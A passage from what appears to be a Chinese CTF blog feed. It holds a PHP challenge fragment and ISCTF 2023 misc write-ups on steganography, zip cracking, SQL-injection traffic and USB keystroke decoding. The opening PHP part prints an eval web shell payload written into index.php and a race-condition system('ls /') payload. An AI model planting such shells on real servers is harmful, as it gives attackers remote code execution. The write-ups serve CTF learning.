5.0.0 中增加了对上下文（Context）的支持。有关上下文（Context）的说明参见 [Streams](php&#x2F;book.stream.html)。返回值成功时返回 &#96;TRUE&#96;， 或者在失败时返回 &#96;FALSE&#96;。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最直接的一个方法就是，你不删除<code>index.php</code>,那就依从你呗，不过我要在该文件里面写🐎，你也会依从我吧，所以我们可以构造payload</p><pre class="line-numbers language-none"><code class="language-none">GET: ctf&#x3D;index.phpPOST: show&#x3D;&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403062030863.png"></p><p>其次就是本题的一个考点了，<code>条件竞争漏洞</code>，payload的构造</p><pre class="line-numbers language-none"><code class="language-none">GET: ctf&#x3D;1.phpPOST: &lt;?php system(&#39;ls &#x2F;&#39;);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>放在BP测试器里面进行<code>没有负载无限制重复</code>，我没有搞成功，不过看网上有的佬写的wp是试成功了。</p><h3 id="web150"><a href="#web150" class="headerlink" title="web150"></a>web150</h3>]]></content>
      
      
      
        <tags>
            
            <tag> php学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023ISCTF部分WP</title>
      <link href="/2023/11/30/2023ISCTF%E9%83%A8%E5%88%86WP/"/>
      <url>/2023/11/30/2023ISCTF%E9%83%A8%E5%88%86WP/</url>
      
        <content type="html"><![CDATA[<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>关注公众号，回复关键词：小蓝鲨，我想打ctf</p><h3 id="你说爱我？尊嘟假嘟"><a href="#你说爱我？尊嘟假嘟" class="headerlink" title="你说爱我？尊嘟假嘟"></a>你说爱我？尊嘟假嘟</h3><p>打开是一个docx文档，里面重重复复只有三句话， 你说爱我，尊嘟，假嘟，考虑其跟Ook的解密相性很大，尝试后将</p><pre><code>你说爱我  -&gt;  Ook.尊嘟   -&gt;  Ook!假嘟   -&gt;  Ook?</code></pre><p>解密得到base64编码</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202312011951795.png">然后进行base64解密得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202312011953943.png"></p><h3 id="小蓝鲨的秘密"><a href="#小蓝鲨的秘密" class="headerlink" title="小蓝鲨的秘密"></a>小蓝鲨的秘密</h3><p>打开压缩包发现里面俩个文件都被加密，用010打开可以发现其是伪加密</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202312011955168.png"></p><p>flag.txt里面给的是一个密文</p><p><strong>U2FsdGVkX1&#x2F;ij5Hxtt6G8tDvbXIQcMLJ6isLpLmxqxW8mOmFIB4DgBGXSR3ceEcj</strong></p><p>图片则是发现高度好像有点问题，修改高度可以得到密钥  <strong>15CTF2023</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202312011956415.png"></p><p>经查询可以得知其为<strong>AES加密</strong>，上网搜索解密网站得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202312011959426.png"></p><h3 id="PNG的基本食用"><a href="#PNG的基本食用" class="headerlink" title="PNG的基本食用"></a>PNG的基本食用</h3><p>三张图片，显而易见考的图片的三种考法</p><p>第一张图片（考查图片宽高）</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202312012002905.png"></p><p>第二张图片（考查stegsolve的使用）</p><p>进入stegsolve然后进行data extract，选rgb全低位即可找到中段flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202312012004652.png"></p><p>第三张图片（010里面可以找到）</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202312012003367.png"></p><p>但我怎么感觉这题好像是想考分离文件，里面应该是有一个part3.txt文件。</p><h3 id="MCSOG-猫猫"><a href="#MCSOG-猫猫" class="headerlink" title="MCSOG-猫猫"></a><strong>MCSOG-猫猫</strong></h3><p>群里面有一个机器人就叫本题题目的名字，对她发送 <strong>flag在哪</strong> 会收到一个信息</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301037157.png"></p><p>将该信息复制放入linux的文件中，通过vim查看可以发现其中有零宽字符隐写</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301038155.png"></p><p>发现其中有&lt;200c&gt;、&lt;202c&gt;、&lt;200e&gt;，将其放入<a href="https://www.mzy0.com/ctftools/zerowidth1/">零宽字符隐写解密网站</a>，勾选其中与其相关的零宽度字符，解密得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301040700.png"></p><h3 id="镜流"><a href="#镜流" class="headerlink" title="镜流"></a>镜流</h3><p>打开压缩包是加密的俩个文件</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301050450.png"></p><p>通过010查看不是伪加密，考虑为需要爆破解密</p><p>得到密码  <strong>306256</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301106885.png"></p><p>得到一张图片和一个提示，<strong>提示为  把图片缩小10倍</strong></p><p>通过图片我们可以看到其上面有很多像素点，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301108993.png"></p><p>通过从网上找的大佬代码修改一下将其缩小十倍</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Imageimg <span class="token operator">=</span> Image<span class="token punctuation">.</span>open<span class="token punctuation">(</span>r<span class="token string">"1new.png"</span><span class="token punctuation">)</span>w <span class="token operator">=</span> img<span class="token punctuation">.</span>widthh <span class="token operator">=</span> img<span class="token punctuation">.</span>heightimg_obj <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">"RGB"</span><span class="token punctuation">,</span><span class="token punctuation">(</span>w<span class="token operator">//</span><span class="token number">10</span><span class="token punctuation">,</span>h<span class="token operator">//</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> x <span class="token keyword">in</span> range<span class="token punctuation">(</span>w<span class="token operator">//</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> y <span class="token keyword">in</span> range<span class="token punctuation">(</span>h<span class="token operator">//</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token punctuation">(</span>r<span class="token punctuation">,</span>g<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token operator">=</span>img<span class="token punctuation">.</span>getpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">,</span>y<span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        img_obj<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span>g<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span>img_obj<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'ok2.png'</span><span class="token punctuation">)</span></code></pre><p>得到一张新的图片</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301111311.png"></p><p>用<strong>stegsolver</strong>打开进行<strong>data extract</strong>发现其藏了一张png图片</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301212732.png"></p><p>保存图片打开得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301213226.png"></p><h3 id="stream"><a href="#stream" class="headerlink" title="stream"></a>stream</h3><p>本题是一道流量题，打开搜索http发现其有sql注入相关的信息，考虑为sql日志分析</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301215941.png"></p><p>首先通过kali虚拟机来分离出这些sql语句</p><blockquote><p>通过该指令</p><p>tshark -r te.pcapng -Y “http.request” -T fields -e http.request.full_uri &gt; data.txt</p><p>来得到其url</p></blockquote><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301218223.png"></p><p>得到后需要在进行一次URL解码从而与脚本对应上</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301226346.png"></p><p>然后通过网上大佬的代码来运行得到flag</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 读取输入文件</span><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'xxx'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> file<span class="token punctuation">:</span>    lines <span class="token operator">=</span> file<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 初始化上一行指定位置的数字</span>prev_digit_position <span class="token operator">=</span> <span class="token number">0</span><span class="token comment" spellcheck="true"># 遍历每一行数据</span><span class="token keyword">for</span> line <span class="token keyword">in</span> lines<span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 获取当前行指定位置的数字</span>    start_index <span class="token operator">=</span> line<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"SELECT flag from answer limit 0,1),"</span><span class="token punctuation">)</span> <span class="token operator">+</span> len<span class="token punctuation">(</span><span class="token string">"SELECT flag from answer limit 0,1),"</span><span class="token punctuation">)</span>    end_index <span class="token operator">=</span> line<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">",1))="</span><span class="token punctuation">)</span>       <span class="token keyword">if</span> start_index <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">and</span> end_index <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        digit_position <span class="token operator">=</span> int<span class="token punctuation">(</span>line<span class="token punctuation">[</span>start_index<span class="token punctuation">:</span>end_index<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 检查指定位置的数字是否发生变化</span>        <span class="token keyword">if</span> prev_digit_position <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">==</span> digit_position<span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># 输出当前行的上一行指定位置的数据</span>            prev_line <span class="token operator">=</span> lines<span class="token punctuation">[</span>lines<span class="token punctuation">.</span>index<span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span>            start_shuju <span class="token operator">=</span> prev_line<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">",1))="</span><span class="token punctuation">)</span> <span class="token operator">+</span> len<span class="token punctuation">(</span><span class="token string">",1))="</span><span class="token punctuation">)</span>            end_shuju <span class="token operator">=</span> prev_line<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"--"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span>int<span class="token punctuation">(</span>prev_line<span class="token punctuation">[</span>start_shuju<span class="token punctuation">:</span>end_shuju<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 更新上一行指定位置的数字</span>        prev_digit_position <span class="token operator">=</span> digit_position</code></pre><p>该代码出自<a href="https://blog.csdn.net/Nanian233/article/details/134699360?ops_request_misc=%7B%22request_id%22:%22170131018416800185840663%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=170131018416800185840663&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~times_rank-2-134699360-null-null.142%5Ev96%5Epc_search_result_base7&utm_term=2023ISCTF&spm=1018.2226.3001.4187">该大佬博客</a></p><p>运行脚本得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301227680.png" alt="、"></p><h3 id="小白小黑"><a href="#小白小黑" class="headerlink" title="小白小黑"></a>小白小黑</h3><p>这个题打开靶机后，看到一堆数字</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301253393.png"></p><p>放入txt中，发现行256，列257，跟二维码十分的像啊，考虑通过代码来生成</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Imageimg <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'L'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'qrcode.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    data <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        pixel_value <span class="token operator">=</span> int<span class="token punctuation">(</span>data<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        img<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">,</span> pixel_value<span class="token punctuation">)</span>img<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'2.png'</span><span class="token punctuation">)</span></code></pre><p>这题当时做的时候我一直在考虑英文有什么用，到现在也不知道(尴尬)，生成得到一个黑色图片，放到stegsolve里面看看</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301302117.png"></p><p>发现藏着一个二维码图片，扫码可以获得flag</p><h3 id="张万森-下雪了"><a href="#张万森-下雪了" class="headerlink" title="张万森,下雪了"></a>张万森,下雪了</h3><p>打开后压缩包一个加密的压缩包，一个dic</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301304954.png"></p><p>打开010发现压缩包不是伪加密，考虑dic.txt是该压缩包的字典，需要用到字典爆破</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301306522.png"></p><p>得到密码   <strong>blueSHARK666</strong></p><p>看似直接得到flag，但显然没有那么简单</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301307857.png"></p><p>结合题目考虑为 SNOW解密，，那么显而易见的就是另一个文件是密码咯</p><p>对tip里面的base64解密直到无法解密，然后对其进行词频分析，得到snow的密码</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301317014.png"></p><p>密码为 <strong>ISCTFZ023</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301319740.png"></p><p>得到真正的flag</p><h3 id="sudopy"><a href="#sudopy" class="headerlink" title="sudopy"></a>sudopy</h3><p>先通过指令连接上该ip</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301323991.png"></p><p>查看当前位置，发现在其有着flag，但是必须是root用户才能访问</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301325955.png"></p><p>查看web.py的信息</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301326492.png"></p><p>发现其导入了一个   <strong>webbrowser</strong> 库</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301329846.png"></p><p>发现这篇文章写过与其相关的<strong>py库劫持使linux权限提升</strong><a href="https://www.freebuf.com/vuls/279298.html">Linux权限提升：Python库劫持 - FreeBuf网络安全行业门户</a></p><p>我这里用到的是另一个佬的方法</p><p>即通过os模块常用函数来通过system输出cat &#x2F;flag的指令</p><h3 id="ezUSB"><a href="#ezUSB" class="headerlink" title="ezUSB"></a>ezUSB</h3><p>这题当时做的时候我是真没想到键盘删除的东西也能有用，并且还起到了大用，最后竟然要靠这个去当密钥拿到flag，属实是长见识了。。。。。</p><p>首先这题我们最明显可以拿到的键盘流量就是2.5.1这边的HID DATA</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301335473.png"></p><p>可以通过tshark来获取这个HID DATA流量</p><p><strong>tshark -r xxx.pcapng -T fields -e usb.capdata &gt; out.txt</strong></p><p>然后再通过下面的代码将其带上冒号</p><pre class=" language-python"><code class="language-python">f<span class="token operator">=</span>open<span class="token punctuation">(</span><span class="token string">'out2.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>fi<span class="token operator">=</span>open<span class="token punctuation">(</span><span class="token string">'out3.txt'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    a<span class="token operator">=</span>f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> a<span class="token punctuation">:</span>        <span class="token keyword">if</span> len<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">16</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># 鼠标流量的话len改为8</span>            out<span class="token operator">=</span><span class="token string">''</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> i<span class="token operator">+</span><span class="token number">2</span> <span class="token operator">!=</span> len<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>                    out<span class="token operator">+=</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>a<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">":"</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    out<span class="token operator">+=</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>a<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span>            fi<span class="token punctuation">.</span>write<span class="token punctuation">(</span>out<span class="token punctuation">)</span>            fi<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>fi<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>通过该键盘分析代码得到后把那段flag</p><pre class=" language-python"><code class="language-python">normalKeys <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"04"</span><span class="token punctuation">:</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"05"</span><span class="token punctuation">:</span><span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"06"</span><span class="token punctuation">:</span><span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token string">"07"</span><span class="token punctuation">:</span><span class="token string">"d"</span><span class="token punctuation">,</span> <span class="token string">"08"</span><span class="token punctuation">:</span><span class="token string">"e"</span><span class="token punctuation">,</span>    <span class="token string">"09"</span><span class="token punctuation">:</span><span class="token string">"f"</span><span class="token punctuation">,</span> <span class="token string">"0a"</span><span class="token punctuation">:</span><span class="token string">"g"</span><span class="token punctuation">,</span> <span class="token string">"0b"</span><span class="token punctuation">:</span><span class="token string">"h"</span><span class="token punctuation">,</span> <span class="token string">"0c"</span><span class="token punctuation">:</span><span class="token string">"i"</span><span class="token punctuation">,</span> <span class="token string">"0d"</span><span class="token punctuation">:</span><span class="token string">"j"</span><span class="token punctuation">,</span>     <span class="token string">"0e"</span><span class="token punctuation">:</span><span class="token string">"k"</span><span class="token punctuation">,</span> <span class="token string">"0f"</span><span class="token punctuation">:</span><span class="token string">"l"</span><span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">:</span><span class="token string">"m"</span><span class="token punctuation">,</span> <span class="token string">"11"</span><span class="token punctuation">:</span><span class="token string">"n"</span><span class="token punctuation">,</span> <span class="token string">"12"</span><span class="token punctuation">:</span><span class="token string">"o"</span><span class="token punctuation">,</span>      <span class="token string">"13"</span><span class="token punctuation">:</span><span class="token string">"p"</span><span class="token punctuation">,</span> <span class="token string">"14"</span><span class="token punctuation">:</span><span class="token string">"q"</span><span class="token punctuation">,</span> <span class="token string">"15"</span><span class="token punctuation">:</span><span class="token string">"r"</span><span class="token punctuation">,</span> <span class="token string">"16"</span><span class="token punctuation">:</span><span class="token string">"s"</span><span class="token punctuation">,</span> <span class="token string">"17"</span><span class="token punctuation">:</span><span class="token string">"t"</span><span class="token punctuation">,</span>       <span class="token string">"18"</span><span class="token punctuation">:</span><span class="token string">"u"</span><span class="token punctuation">,</span> <span class="token string">"19"</span><span class="token punctuation">:</span><span class="token string">"v"</span><span class="token punctuation">,</span> <span class="token string">"1a"</span><span class="token punctuation">:</span><span class="token string">"w"</span><span class="token punctuation">,</span> <span class="token string">"1b"</span><span class="token punctuation">:</span><span class="token string">"x"</span><span class="token punctuation">,</span> <span class="token string">"1c"</span><span class="token punctuation">:</span><span class="token string">"y"</span><span class="token punctuation">,</span>        <span class="token string">"1d"</span><span class="token punctuation">:</span><span class="token string">"z"</span><span class="token punctuation">,</span><span class="token string">"1e"</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"1f"</span><span class="token punctuation">:</span><span class="token string">"2"</span><span class="token punctuation">,</span> <span class="token string">"20"</span><span class="token punctuation">:</span><span class="token string">"3"</span><span class="token punctuation">,</span> <span class="token string">"21"</span><span class="token punctuation">:</span><span class="token string">"4"</span><span class="token punctuation">,</span>         <span class="token string">"22"</span><span class="token punctuation">:</span><span class="token string">"5"</span><span class="token punctuation">,</span> <span class="token string">"23"</span><span class="token punctuation">:</span><span class="token string">"6"</span><span class="token punctuation">,</span><span class="token string">"24"</span><span class="token punctuation">:</span><span class="token string">"7"</span><span class="token punctuation">,</span><span class="token string">"25"</span><span class="token punctuation">:</span><span class="token string">"8"</span><span class="token punctuation">,</span><span class="token string">"26"</span><span class="token punctuation">:</span><span class="token string">"9"</span><span class="token punctuation">,</span>         <span class="token string">"27"</span><span class="token punctuation">:</span><span class="token string">"0"</span><span class="token punctuation">,</span><span class="token string">"28"</span><span class="token punctuation">:</span><span class="token string">"&lt;RET>"</span><span class="token punctuation">,</span><span class="token string">"29"</span><span class="token punctuation">:</span><span class="token string">"&lt;ESC>"</span><span class="token punctuation">,</span><span class="token string">"2a"</span><span class="token punctuation">:</span><span class="token string">"&lt;DEL>"</span><span class="token punctuation">,</span> <span class="token string">"2b"</span><span class="token punctuation">:</span><span class="token string">"\t"</span><span class="token punctuation">,</span>         <span class="token string">"2c"</span><span class="token punctuation">:</span><span class="token string">"&lt;SPACE>"</span><span class="token punctuation">,</span><span class="token string">"2d"</span><span class="token punctuation">:</span><span class="token string">"-"</span><span class="token punctuation">,</span><span class="token string">"2e"</span><span class="token punctuation">:</span><span class="token string">"="</span><span class="token punctuation">,</span><span class="token string">"2f"</span><span class="token punctuation">:</span><span class="token string">"["</span><span class="token punctuation">,</span><span class="token string">"30"</span><span class="token punctuation">:</span><span class="token string">"]"</span><span class="token punctuation">,</span><span class="token string">"31"</span><span class="token punctuation">:</span><span class="token string">"\\"</span><span class="token punctuation">,</span>         <span class="token string">"32"</span><span class="token punctuation">:</span><span class="token string">"&lt;NON>"</span><span class="token punctuation">,</span><span class="token string">"33"</span><span class="token punctuation">:</span><span class="token string">";"</span><span class="token punctuation">,</span><span class="token string">"34"</span><span class="token punctuation">:</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">"35"</span><span class="token punctuation">:</span><span class="token string">"&lt;GA>"</span><span class="token punctuation">,</span><span class="token string">"36"</span><span class="token punctuation">:</span><span class="token string">","</span><span class="token punctuation">,</span><span class="token string">"37"</span><span class="token punctuation">:</span><span class="token string">"."</span><span class="token punctuation">,</span>         <span class="token string">"38"</span><span class="token punctuation">:</span><span class="token string">"/"</span><span class="token punctuation">,</span><span class="token string">"39"</span><span class="token punctuation">:</span><span class="token string">"&lt;CAP>"</span><span class="token punctuation">,</span><span class="token string">"3a"</span><span class="token punctuation">:</span><span class="token string">"&lt;F1>"</span><span class="token punctuation">,</span><span class="token string">"3b"</span><span class="token punctuation">:</span><span class="token string">"&lt;F2>"</span><span class="token punctuation">,</span> <span class="token string">"3c"</span><span class="token punctuation">:</span><span class="token string">"&lt;F3>"</span><span class="token punctuation">,</span><span class="token string">"3d"</span><span class="token punctuation">:</span><span class="token string">"&lt;F4>"</span><span class="token punctuation">,</span>         <span class="token string">"3e"</span><span class="token punctuation">:</span><span class="token string">"&lt;F5>"</span><span class="token punctuation">,</span><span class="token string">"3f"</span><span class="token punctuation">:</span><span class="token string">"&lt;F6>"</span><span class="token punctuation">,</span><span class="token string">"40"</span><span class="token punctuation">:</span><span class="token string">"&lt;F7>"</span><span class="token punctuation">,</span><span class="token string">"41"</span><span class="token punctuation">:</span><span class="token string">"&lt;F8>"</span><span class="token punctuation">,</span><span class="token string">"42"</span><span class="token punctuation">:</span><span class="token string">"&lt;F9>"</span><span class="token punctuation">,</span><span class="token string">"43"</span><span class="token punctuation">:</span><span class="token string">"&lt;F10>"</span><span class="token punctuation">,</span>         <span class="token string">"44"</span><span class="token punctuation">:</span><span class="token string">"&lt;F11>"</span><span class="token punctuation">,</span><span class="token string">"45"</span><span class="token punctuation">:</span><span class="token string">"&lt;F12>"</span><span class="token punctuation">}</span>shiftKeys <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"04"</span><span class="token punctuation">:</span><span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token string">"05"</span><span class="token punctuation">:</span><span class="token string">"B"</span><span class="token punctuation">,</span> <span class="token string">"06"</span><span class="token punctuation">:</span><span class="token string">"C"</span><span class="token punctuation">,</span> <span class="token string">"07"</span><span class="token punctuation">:</span><span class="token string">"D"</span><span class="token punctuation">,</span> <span class="token string">"08"</span><span class="token punctuation">:</span><span class="token string">"E"</span><span class="token punctuation">,</span>     <span class="token string">"09"</span><span class="token punctuation">:</span><span class="token string">"F"</span><span class="token punctuation">,</span> <span class="token string">"0a"</span><span class="token punctuation">:</span><span class="token string">"G"</span><span class="token punctuation">,</span> <span class="token string">"0b"</span><span class="token punctuation">:</span><span class="token string">"H"</span><span class="token punctuation">,</span> <span class="token string">"0c"</span><span class="token punctuation">:</span><span class="token string">"I"</span><span class="token punctuation">,</span> <span class="token string">"0d"</span><span class="token punctuation">:</span><span class="token string">"J"</span><span class="token punctuation">,</span>      <span class="token string">"0e"</span><span class="token punctuation">:</span><span class="token string">"K"</span><span class="token punctuation">,</span> <span class="token string">"0f"</span><span class="token punctuation">:</span><span class="token string">"L"</span><span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">:</span><span class="token string">"M"</span><span class="token punctuation">,</span> <span class="token string">"11"</span><span class="token punctuation">:</span><span class="token string">"N"</span><span class="token punctuation">,</span> <span class="token string">"12"</span><span class="token punctuation">:</span><span class="token string">"O"</span><span class="token punctuation">,</span>       <span class="token string">"13"</span><span class="token punctuation">:</span><span class="token string">"P"</span><span class="token punctuation">,</span> <span class="token string">"14"</span><span class="token punctuation">:</span><span class="token string">"Q"</span><span class="token punctuation">,</span> <span class="token string">"15"</span><span class="token punctuation">:</span><span class="token string">"R"</span><span class="token punctuation">,</span> <span class="token string">"16"</span><span class="token punctuation">:</span><span class="token string">"S"</span><span class="token punctuation">,</span> <span class="token string">"17"</span><span class="token punctuation">:</span><span class="token string">"T"</span><span class="token punctuation">,</span>        <span class="token string">"18"</span><span class="token punctuation">:</span><span class="token string">"U"</span><span class="token punctuation">,</span> <span class="token string">"19"</span><span class="token punctuation">:</span><span class="token string">"V"</span><span class="token punctuation">,</span> <span class="token string">"1a"</span><span class="token punctuation">:</span><span class="token string">"W"</span><span class="token punctuation">,</span> <span class="token string">"1b"</span><span class="token punctuation">:</span><span class="token string">"X"</span><span class="token punctuation">,</span> <span class="token string">"1c"</span><span class="token punctuation">:</span><span class="token string">"Y"</span><span class="token punctuation">,</span>         <span class="token string">"1d"</span><span class="token punctuation">:</span><span class="token string">"Z"</span><span class="token punctuation">,</span><span class="token string">"1e"</span><span class="token punctuation">:</span><span class="token string">"!"</span><span class="token punctuation">,</span> <span class="token string">"1f"</span><span class="token punctuation">:</span><span class="token string">"@"</span><span class="token punctuation">,</span> <span class="token string">"20"</span><span class="token 